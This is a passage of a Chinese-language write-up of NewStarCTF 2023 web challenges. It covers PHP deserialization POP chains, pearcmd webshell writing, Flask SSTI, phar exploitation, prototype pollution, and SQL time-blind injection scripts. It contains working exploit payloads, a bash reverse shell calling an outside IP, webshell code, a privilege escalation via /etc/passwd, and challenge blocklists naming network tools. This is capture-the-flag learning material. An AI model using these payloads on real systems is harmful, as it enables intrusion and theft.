low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    time.sleep(0.3)\n    print(result)\n```\n\n## Include\n\n考点:\n\n- pearcmd\n\n根据提示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697164131734-b78abbc2-ee62-4767-965e-11accdbf5e48.png)\n\n`register_argc_argv`是on\n\n那么`register_argc_argv`是什么呢 \n\n简单说` register_argc_argv`开启时我们传入get的参数会被记录在`$_SERVER`这个全局变量数组中\n\n并且$argc变量是⽤于记录数组的⼤⼩ $argv变量是⽤于记录输⼊的参数\n\n条件：\n\n- ⽼版本（测试版本为5.2.17）默认为 On\n- 新版本（测试版本为 5.4.45、5.5.9、7.3.4）默认为 Off\n\n我们要传入如果正常传入参数，数组的大小永远是1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165693345-4172a348-e3bd-473c-b24a-303757cc3b1e.png)\n\n如果要表示两个数组，需要用+隔开\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165707316-253cea3f-c08e-4f2d-b928-46805a4bceee.png)\n\n来自：\n\nhttps://www.shawroot.cc/1643.html\n\nhttps://cloud.tencent.com/developer/article/2204400?areaId=106001\n\n一般这个搭配pearcmd使用 写马到网站根目录下 然后包含rce即可\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[1])?>+/tmp/hello.php\n```\n\n记得要抓一次包重写一下一句话木马 不然会被转码导致不成功\n\n\n\n## POP Gadget\n\n考点：\n\n- php反序列化\n\n源码如下\n\n```java\n<?php\nhighlight_file(__FILE__);\n\nclass Begin{\n    public $name;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/[a-zA-Z0-9]/\",$this->name)){\n            echo \"Hello\";\n        }else{\n            echo \"Welcome to NewStarCTF 2023!\";\n        }\n    }\n}\n\nclass Then{\n    private $func;\n\n    public function __toString()\n    {\n        ($this->func)();\n        return \"Good Job!\";\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __call($func, $vars)\n    {\n        $this->obj->end();\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __invoke()\n    {\n        $this->obj->getStr();\n    }\n\n    public function end()\n    {\n        die(\"==GAME OVER==\");\n    }\n}\n\nclass CTF{\n    public $handle;\n\n    public function end()\n    {\n        unset($this->handle->log);\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __unset($var)\n    {\n        ($this->func)($this->var);    \n    }\n}\n\n@unserialize($_POST['pop']);\n```\n\nexp：\n\n```java\n<?php\nclass Begin{\n    public $name;\n}\nclass Then{\n    private $func;\n    public function __construct(){\n        $this->func = new Super();\n    }\n}\nclass Handle{\n    protected $obj;\n    public function __construct(){\n        $this->obj = new CTF();\n    }\n}\nclass Super{\n    protected $obj;\n    public function __construct(){\n        $this->obj = new Handle();\n    }\n}\nclass CTF{\n    public $handle;\n    public function __construct(){\n        $this->handle = new WhiteGod();\n    }\n\n\n}\nclass WhiteGod{\n    public $func = 'system';\n    public $var = 'cat /flag';\n}\n$a = new Begin();\n$a->name = new Then();\necho urlencode(serialize($a));\n```\n\n## GenShin\n\n考点：\n\n- flask ssti\n\n抓包获得\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166037980-4bb0dd83-1b97-4a6c-b1f6-c2c8566ddbab.png)\n\n一眼丁真flask ssti注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166058190-e47aa6de-380f-42ef-a2ce-f04c871166e3.png)\n\n直接当脚本小子\n\n或者payload:\n\n```\n{%print(((g.pop.__globals__.__builtins__.__import__(\"os\")[\"p\"\"open\"](\"cat /flag\")).read()))%}\n```\n\n## R!!!C!!!E!!!\n\n源码：\n\n```java\n<?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n}\n```\n\npayload:\n\n反序列化套一下就行了\n\n```\ncat /flag|t\\e\\e /var/www/html/1\n```\n\n将读到的flag通过管道符用tee写道网站根目录下 然后访问\n\n关键字通过反斜杠转义来绕过`\\`\n\n## OtenkiGirl\n\n考点：\n\n- nodejs 原型链污染\n\n我是傻逼 关键东西老是看不到\n\n给了源码\n\n根据提示我们只需要关注routes包下的内容即可 也不需要sql注入\n\ninfo.js\n\n```java\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst SQL = require(\"./sql\");\nconst sql = new SQL(\"wishes\");\nconst CONFIG = require(\"../config\")\nconst DEFAULT_CONFIG = require(\"../config.default\")\n\nasync function getInfo(timestamp) {\n    timestamp = typeof timestamp === \"number\" ? timestamp : Date.now();\n    // Remove test data from before the movie was released\n    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();\n    timestamp = Math.max(timestamp, minTimestamp);\n    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });\n    return data;\n}\n\nrouter.post(\"/info/:ts?\", async (ctx) => {\n    if (ctx.header[\"content-type\"] !== \"application/x-www-form-urlencoded\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Content-Type must be application/x-www-form-urlencoded\"\n        }\n    if (typeof ctx.params.ts === \"undefined\") ctx.params.ts = 0\n    const timestamp = /^[0-9]+$/.test(ctx.params.ts || \"\") ? Number(ctx.params.ts) : ctx.params.ts;\n    if (typeof timestamp !== \"number\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Invalid parameter ts\"\n        }\n\n    try {\n        const data = await getInfo(timestamp).catch(e => { throw e });\n        ctx.body = {\n            status: \"success\",\n            data: data\n        }\n    } catch (e) {\n        console.error(e);\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Internal Server Error\"\n        }\n    }\n})\n\nmodule.exports = router;\n```\n\nsubmit.js\n\n```java\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst SQL = require(\"./sql\");\nconst sql = new SQL(\"wishes\");\nconst Base58 = require(\"base-58\");\n\nconst ALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\nconst rndText = (length) => {\n    return Array.from({ length }, () => ALPHABET[Math.floor(Math.random() * ALPHABET.length)]).join('');\n}\n\nconst timeText = (timestamp) => {\n    timestamp = (typeof timestamp === \"number\" ? timestamp : Date.now()).toString();\n    let text1 = timestamp.substring(0, timestamp.length / 2);\n    let text2 = timestamp.substring(timestamp.length / 2)\n    let text = \"\";\n    for (let i = 0; i < text1.length; i++)\n        text += text1[i] + text2[text2.length - 1 - i];\n    if (text2.length > text1.length) text += text2[0];\n    return Base58.encode(rndText(3) + Buffer.from(text)); // length = 20\n}\n\nconst rndID = (length, timestamp) => {\n    const t = timeText(timestamp);\n    if (length < t.length) return t.substring(0, length);\n    else return t + rndText(length - t.length);\n}\n\nasync function insert2db(data) {\n    let date = String(data[\"date\"]), place = String(data[\"place\"]),\n        contact = String(data[\"contact\"]), reason = String(data[\"reason\"]);\n    const timestamp = Date.now();\n    const wishid = rndID(24, timestamp);\n    await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,\n        [wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });\n    return { wishid, date, place, contact, reason, timestamp }\n}\n\nconst merge = (dst, src) => {\n    if (typeof dst !== \"object\" || typeof src !== \"object\") return dst;\n    for (let key in src) {\n        if (key in dst && key in src) {\n            dst[key] = merge(dst[key], src[key]);\n        } else {\n            dst[key] = src[key];\n        }\n    }\n    return dst;\n}\n\nrouter.post(\"/submit\", async (ctx) => {\n    if (ctx.header[\"content-type\"] !== \"application/json\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Content-Type must be application/json\"\n        }\n\n    const jsonText = ctx.request.rawBody || \"{}\"\n    try {\n        const data = JSON.parse(jsonText);\n\n        if (typeof data[\"contact\"] !== \"string\" || typeof data[\"reason\"] !== \"string\")\n            return ctx.body = {\n                status: \"error\",\n                msg: \"Invalid parameter\"\n            }\n        if (data[\"contact\"].length <= 0 || data[\"reason\"].length <= 0)\n            return ctx.body = {\n                status: \"error\",\n                msg: \"Parameters contact and reason cannot be empty\"\n            }\n\n        const DEFAULT = {\n            date: \"unknown\",\n            place: \"unknown\"\n        }\n        const result = await insert2db(merge(DEFAULT, data));\n        ctx.body = {\n            status: \"success\",\n            data: result\n        };\n    } catch (e) {\n        console.error(e);\n        ctx.body = {\n            status: \"error\",\n            msg: \"Internal Server Error\"\n        }\n    }\n})\n\nmodule.exports = router;\n```\n\n比较关键的就是这两个文件内容\n\n简单审计一下\n\n它会将我们提交的内容展示出来 \n\n并且会经过merge一个合并函数 熟人了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166758715-338c47b1-47e3-4ac6-9785-be333a06fc3c.png)\n\n内容包括`data,place,contact,reason,timestamp(时间戳)`\n\n那么在这里需要污染的点是什么呢 \n\n其实在这里给了提示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166888157-91644cb2-2103-49b6-b72c-2175670971f3.png)\n\n```\n// Remove test data from before the movie was released\n```\n\n`“他会删除电影上映前的数据”` 也就是我们想要的数据在之前的时间里\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167165409-d0be8833-d256-44c9-a712-ad8cedc046cd.png)\n\n再看上面`||`条件语句 存在一个短路 默认min_public_time是2019-07-09\n\nCONFIG.min_public_time默认是无的 不存在\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697274880739-9d9bc3d7-e83f-43d7-a46c-452764c272a1.png)\n\n如果`CONFIG.min_public_time`有值那么短路就不会`new default min_public_time`的值\n\n那么就需要原型链污染去修改这个`CONFIG.min_public_time`\n\n`min_public_time`在config.default文件 然后被引入的 格式是这样的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167312141-c99bbfb6-154d-4920-aad1-2d15c7586b7a.png)\n\n只需要将这个时间改比它默认值小就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167358763-2fd909df-fef3-4b62-bb20-85c359e4dfd3.png)\n\n为什么呢 因为我们之前提交数据的时候会有一个时间戳 这个最小时间戳的生成是由这个`CONFIG.min_public_time`影响的\n\n```\nlet minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();\ntimestamp = Math.max(timestamp, minTimestamp);\n```\n\n所以修改`CONFIG.min_public_time`就会修改最总时间戳 使其回到之前的时间就能将之前的数据读出来\n\n然后根据代码逻辑 访问`/info/一个小值` 内容就被打印出来\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167409474-8c8f8358-af0f-44f2-8d83-ce6749dde650.png)\n\n# WEEK4\n\n## More Fast\n\n考点：\n\n- fast destruct\n\nexp\n\n```javascript\n<?php\nclass Start{\n    public $errMsg;\n}\n\nclass Pwn{\n    public $obj;\n}\n\nclass Reverse{\n    public $func;\n\n}\n\nclass Web{\n    public $func;\n    public $var;\n}\n\nclass Crypto{\n    public $obj;\n\n}\n\nclass Misc{\n}\n$a = new Start();\n$a->errMsg = new Crypto();\n$a->errMsg->obj = new Reverse();\n$a->errMsg->obj->func = new Pwn();\n$a->errMsg->obj->func->obj = new Web();\n$a->errMsg->obj->func->obj->var = \"cat /f*\";\n$a->errMsg->obj->func->obj->func = \"system\";\necho serialize($a);\n#O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n```\n\n## 逃\n\n一眼丁真 鉴定为反序列化字符串逃逸\n\n考点：\n\n- 反序列化字符串逃逸\n\n从bad->good会多出一个字符 那么经过序列化->waf->反序列化就会有一个字符逃逸出来\n\n举例执行whoami \n\n将这一串塞入`\";s:3:\"cmd\";s:6:\"whoami\";}`那么就需要26个字符逃逸出来 那么就需要26个bad\n\npaylaod：`badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:6:\"whoami\";}`\n\n其他命令根据字符个数改相应的bad个数调整即可\n\npayload：`?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n## flask disk\n\n这道题我应该是非预期了\n\n我的做法是 直接上传app.py 内容直接是python命令执行反弹shell \n\n这样会覆盖题目的app.py 直接拿下\n\n知识点：`flask开启了debug模式下，app.py源文件被修改后会立刻加载。  `\n\n## PharOne\n\n这道题太可惜了\n\n一眼丁真就是phar反序列化利用\n\n当时由于自己开了vpn 导致反弹shell一直过不来  错失良机\n\n考点：\n\n- phar反序列化\n\n首先给了恶意类\n\n```javascript\n<?php\nhighlight_file(__FILE__);\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n@unlink($_POST['file']);\n```\n\n先生成一个phar文件\n\n```javascript\n<?php\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n$a = new Flag();\n$a->cmd = 'bash -c \"bash -i >& /dev/tcp/8.130.34.53/7777 0>&1\"';\n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata($a); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering(); \n?>\n```\n\n上传上去之后显示过滤了__HALT_COMPILER\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642632042-0e857bfb-849f-4ca9-96eb-8ab35051a90b.png)\n\n可以通过gzip压缩绕过 来自：[php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)反序列化漏洞及各种绕过姿势/)![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642675212-31124284-5660-49f3-8ded-02d920345766.png)\n\n然后还会检测上传文件后缀名以及mine \n\n当然phar文件后缀名是无关紧要的 不是`.phar`照样能解析\n\n所以将打包的压缩包改为任意后缀名都行\n\n然后注意这里`phar://`协议要到`Z1d10t.phar`\n\n上传上去之后`file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/Z1d10t.phar`\n\n记得关vpn 哭死\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642947630-648bd479-d31a-42a1-a3db-e854baf8d485.png)\n\n## InjectMe\n\n考点:\n\n- jinja2 ssti\n\n首先是任意文件读取\n\n```\n/download?file=/app/app.py\n```\n\n获得源码：\n\n```javascript\nimport os\nimport re\n\nfrom flask import Flask, render_template, request, abort, send_file, session, render_template_string\nfrom config import secret_key\n\napp = Flask(__name__)\napp.secret_key = secret_key\n\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return render_template('index.html')\n\n\n@app.route(\"/cancanneed\", methods=[\"GET\"])\ndef cancanneed():\n    all_filename = os.listdir('./static/img/')\n    filename = request.args.get('file', '')\n    if filename:\n        return render_template('img.html', filename=filename, all_filename=all_filename)\n    else:\n        return f\"{str(os.listdir('./static/img/'))} <br> <a href=\\\"/cancanneed?file=1.jpg\\\">/cancanneed?file=1.jpg</a>\"\n\n\n@app.route(\"/download\", methods=[\"GET\"])\ndef download():\n    filename = request.args.get('file', '')\n    if filename:\n        filename = filename.replace('../', '')\n        filename = os.path.join('static/img/', filename)\n        print(filename)\n        if (os.path.exists(filename)) and (\"start\" not in filename):\n            return send_file(filename)\n        else:\n            abort(500)\n    else:\n        abort(404)\n\n\n@app.route('/backdoor', methods=[\"GET\"])\ndef backdoor():\n    try:\n        print(session.get(\"user\"))\n        if session.get(\"user\") is None:\n            session['user'] = \"guest\"\n        name = session.get(\"user\")\n        if re.findall(\n                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.',\n                name):\n            abort(500)\n        else:\n            return render_template_string(\n                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)\n    except Exception:\n        abort(500)\n\n\n@app.errorhandler(404)\ndef page_not_find(e):\n    return render_template('404.html'), 404\n\n\n@app.errorhandler(500)\ndef internal_server_error(e):\n    return render_template('500.html'), 500\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=8080)\n```\n\n发现`/backdoor` 可以进行ssti 但是先获取key\n\n查看源码 可以发现secret是由config引进来的\n\n```\nfrom config import secret_key\n```\n\n读取key`/download?file=/app/config.py`获得`secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"`\n\n最难绷的就是这个session里面进行ssti payload一多就会爆500错真的让人难绷\n\n能不能对session的获取加个base64编解码。。。 真的会方便很多 \n\n还有session伪造的时候转义。。。。编个码吧\n\npayload：`{% print(config['_''_cl''ass_''_']['_''_in''it_''_']['_''_glo''bals_''_']['o''s']['pop''en']('head /y0*')['read']()) %}\"}'`\n\n## midsql\n\n考点:\n\n- sql时间盲注\n\n这个题目找到自己缺漏的地方了 没咋好好做过时间盲注\n\n导致自己写的脚本注起来太慢了\n\n```javascript\nimport requests\nimport time\nurl = 'http://fef1d48c-1c22-46b2-aba3-0d22fafc8c10.node4.buuoj.cn:81'\nresult=''\nfor i in range(1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = \"1/**/And/**/if(ascii(substr((select/**/group_Concat(name)/**/from/**/ctf.items),{},1))/**/>/**/{},sleep(5),0)%23\".format(i,mid)\n        #爆库：1/**/And/**/if(ascii(substr(database(),{},1))/**/>/**/{},sleep(5),0)%23\n        #报表：1/**/And/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{},1))/**/>/**/{},sleep(5),0)%23\n        #爆列：1/**/And/**/if(ascii(Substr((Select(group_Concat(column_name))from(Information_schema.columns)Where(table_name/**/like/**/'items')),{},1))/**/>/**/{},sleep(4),0)%23\n        #爆数据：\n        timestart = time.time()\n        r = requests.get(url+\"?id=\"+paylaod)\n        timeend = time.time()\n        if (timeend - timestart >= 3):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    print(result)\n```\n\n通过时间差值来判断有时候会不准 \n\n最好通过捕获异常的方式进行判断会更准\n\n更好的方式:\n\n```javascript\nimport requests\nfrom tqdm import trange\nres = ''\nlast = ' '\nheaders = {\n    'Host': '32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81',\n    'Cache-Control': 'max-age=0',\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n    'Referer': 'http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-CN,zh;q=0.9'\n}\nfor i in trange(1, 1000):\n    for j in range(127, 31, -1):\n        url = r'http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/?id='\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))>{j}),sleep(3),0)' # information_schema,mysql,performance_schema,sys,test,ctf\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/database()),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\"ctf\"),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\"items\"),{i},1))>{j}),sleep(3),0)' # id,name,price\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        url = url + payload\n        # print(url)\n        try:\n            response = requests.get(url=url, timeout=3)\n        except Exception as e:\n            last = res\n            # print(chr(j+1))\n            res += chr(j+1)\n            # print(res)\n            break\n    print('[*] ' + res)\n```\n\n## OtenkiBoy（未解出）\n\n不太会 不想代码审计了qwq\n\n# WEEK5\n\n## Unserialize Again\n\n考点：\n\n- phar反序列化\n- phar重签名\n\n源码如下：\n\n```javascript\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);  \nclass story{\n    private $user='admin';\n    public $pass;\n    public $eating;\n    public $God='false';\n    public function __wakeup(){\n        $this->user='human';\n        if(1==1){\n            die();\n        }\n        if(1!=1){\n            echo $fffflag;\n        }\n    }\n    public function __construct(){\n        $this->user='AshenOne';\n        $this->eating='fire';\n        die();\n    }\n    public function __tostring(){\n        return $this->user.$this->pass;\n    }\n    public function __invoke(){\n        if($this->user=='admin'&&$this->pass=='admin'){\n            echo $nothing;\n        }\n    }\n    public function __destruct(){\n        if($this->God=='true'&&$this->user=='admin'){\n            system($this->eating);\n        }\n        else{\n            die('Get Out!');\n        }\n    }\n}                 \nif(isset($_GET['pear'])&&isset($_GET['apple'])){\n    // $Eden=new story();\n    $pear=$_GET['pear'];\n    $Adam=$_GET['apple'];\n    $file=file_get_contents('php://input');\n    file_put_contents($pear,urldecode($file));\n    file_exists($Adam);\n}\nelse{\n    echo '多吃雪梨';\n} \n```\n\n### 非预期\n\n非预期了\n\n由于没有控制路径\n\n直接写马到网站根目录就行了\n\n```javascript\n/pairing.php?pear=/var/www/html/a.php&apple=1\nx=system('cat /flllag');\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988088416-7cd82ab6-f545-4824-8ccf-6e9813e9255a.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988099715-8340a7be-7dd9-4926-9ba8-a0a6b2ab7fb6.png)\n\n之后看看预期解学习\n\n### 预期解\n\n看了官方文档预期解来了\n\n考察的phar重签名的知识点\n\n首先恶意类利用很简单 只需要`__wakeup和__destruct`即可\n\n```javascript\n<?php\nclass story{\n    public $eating = 'cat /f*';\n    public $God='true';\n}\n$phar = new Phar(\"Z1d10t.phar\");\n$phar->startBuffering();\n$phar->setStub(\"<php __HALT_COMPILER(); ?>\");\n$o = new story();\n$phar->setMetadata($o);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n```\n\n`__wakeup`通过修改类属性个数绕过即可 这里就涉及到一个phar重签名的问题\n\n因为我们的恶意payload是在phar文件中 生成phar之后修改类属性个数\n\n按照官方WP\n\n> phar的最后有一段signature，是phar的签名，放在文件末尾，要注意因为我们修改了文件的内容，之前的签名就会无效，所以需要更换一个新的签名\n\n修改签名脚本如下：\n\n```javascript\nfrom hashlib import sha1\nwith open('Z1d10t.phar', 'rb') as file:\n    f = file.read()\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型和GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nwith open('ChangedPhar.phar', 'wb') as file:\n    file.write(newf) # 写入新文件\n```\n\n然后将修改签名后的文件内容读出来url编码之后通过post传进去 \n\n再通过`phar://`协议读取即可成功rce \n\n但是我没复现成功  我反弹shell去看上传的文件内容也没错 但是就是不得解 不知道什么原因\n\n用官方WP中的脚本 也不成功\n\n## Final\n\n报错发现是thinkphp5.0.23 那么可以直接根据版本去找漏洞利用\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698479533782-f7d4c9e8-4bd6-4a96-b468-7e9225580e39.png)\n\n这里当时为了抢一血直接用工具梭哈了\n\n写马到网站根目录下 发现禁了system 那么我们用passthru或者exec等无回显函数都可以 反正我们要进行反弹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481376316-6c17aacc-a517-4047-95f5-cd46b8a6a792.png)\n\n记得payload要url编码一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481525990-8c6fad3d-f5c8-4968-afa3-4cfa7cf6d689.png)\n\n发现权限不够 涉及提权 那一般是考察suid提权 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481570952-e9ed3e3d-a994-4707-97f2-5fe5a50e12cf.png)\n\n看看哪些命令有suid\n\n有cp 呢铁定是cp提权了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481643850-8aaf3276-06d0-4874-83c3-864ea8233ae4.png)\n\n直接把内容复制到/etc/passwd 然后拿flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481704911-05884a79-1873-4441-b306-6615bb8d8e1c.png)\n\n## pppython?\n\n这道题目应该借鉴的是SCTF2023的`pypyp？`\n\n考点：\n\n- ssrf\n- flask pin码计算\n- gopher协议\n\n做这道题目之前庆幸学习了0xgame2023一道ssrf打redis主从复制题目\n\n学习Aecous师傅的的WP:) 师傅太强力ORZ\n\n源码如下：\n\n```javascript\n<?php\n    \n    if ($_REQUEST['hint'] == [\"your?\", \"mine!\", \"hint!!\"]){\n        header(\"Content-type: text/plain\");\n        system(\"ls / -la\");\n        exit();\n    }\n    \n    try {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);\n        $output = curl_exec($ch);\n        echo $output;\n        curl_close($ch);   \n    }catch (Error $x){\n        highlight_file(__FILE__);\n        highlight_string($x->getMessage());\n    }\n\n?> \n```\n\n首先根据题目获取提示\n\n```\n?hint[]=your%3F&hint[]=mine!&hint[]=hint!!\n```\n\n拿到了/目录下的文件情况\n\n可以醒目的发现app.py\n\n```javascript\ntotal 12\ndrwxr-xr-x    1 root root  51 Oct 22 15:23 .\ndrwxr-xr-x    1 root root  51 Oct 22 15:23 ..\n-rwxr-xr-x    1 root root   0 Oct 22 15:23 .dockerenv\n-rwxr-xr-x    1 root root 353 Oct 19 15:52 app.py\nlrwxrwxrwx    1 root root   7 Nov 22  2021 bin -> usr/bin\ndrwxr-xr-x    2 root root   6 Nov  8  2021 boot\ndrwxr-xr-x    5 root root 360 Oct 22 15:23 dev\ndrwxr-xr-x    1 root root  66 Oct 22 15:23 etc\n-rw-------    1 root root  43 Oct 22 15:23 flag\ndrwxr-xr-x    2 root root   6 Nov  8  2021 home\nlrwxrwxrwx    1 root root   7 Nov 22  2021 lib -> usr/lib\nlrwxrwxrwx    1 root root   9 Nov 22  2021 lib32 -> usr/lib32\nlrwxrwxrwx    1 root root   9 Nov 22  2021 lib64 -> usr/lib64\nlrwxrwxrwx    1 root root  10 Nov 22  2021 libx32 -> usr/libx32\ndrwxr-xr-x    2 root root   6 Nov 22  2021 media\ndrwxr-xr-x    2 root root   6 Nov 22  2021 mnt\ndrwxr-xr-x    2 root root   6 Nov 22  2021 opt\ndr-xr-xr-x 3110 root root   0 Oct 22 15:23 proc\ndrwx------    1 root root  20 Oct 19 15:52 root\ndrwxr-xr-x    1 root root  21 Oct 19 15:50 run\nlrwxrwxrwx    1 root root   8 Nov 22  2021 sbin -> usr/sbin\ndrwxr-xr-x    2 root root   6 Nov 22  2021 srv\n-rwx------    1 root root 241 Oct 19 15:52 start.sh\ndr-xr-xr-x   13 root root   0 Sep 19 01:23 sys\ndrwxrwxrwt    1 root root   6 Oct 22 15:23 tmp\ndrwxr-xr-x    1 root root  19 Nov 22  2021 usr\ndrwxr-xr-x    1 root root  17 Oct 19 15:49 var\n```\n\n那么通过file伪协议去读取文件`?url=file://127.0.0.1/app.py&lolita[]=1`\n\napp.py\n\n```javascript\nfrom flask import Flask, request, session, render_template, render_template_string\nimport os, base64\n#from NeepuF1Le import neepu_files\n\napp = 